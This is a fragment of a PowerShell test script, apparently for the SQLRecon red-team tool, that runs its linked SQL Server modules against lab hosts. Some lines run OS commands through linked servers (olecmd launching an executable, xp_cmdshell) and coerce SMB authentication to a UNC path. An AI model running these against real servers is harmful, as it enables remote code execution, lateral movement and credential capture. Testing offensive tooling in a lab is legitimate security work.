...
Execute "$sqlreconPath /auth:$authentication /host:$server1 /link:$server1 /i:invaliduser /m:links"
...
Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2 /m:tables /db:AdventureWorks"
Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2,$server3 /m:query /c:'select @@servername'"
Execute "$sqlreconPath /a:$authentication /h:$server3 /l:$server4 /m:smb /unc:\\172.16.40.110\test"
Write-Output ""
Write-Output "[+] Executing Privileged Commands"
Write-Output ""
Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2 /m:columns /db:AdventureWorks /table:Product"
Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2 /m:rows /db:AdventureWorks /table:SalesLT.Product"
Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2 /m:search /db:AdventureWorks /keyword:Product"
...
Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2 /m:olecmd /c:'c:\temp\mb-link-2.exe'"
Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2 /m:xpcmd /c:'tasklist'"
Write-Output "---------------------------------------------------------------------"
Write-Output "[+] SQLRecon - Linked Modules Test Cases"
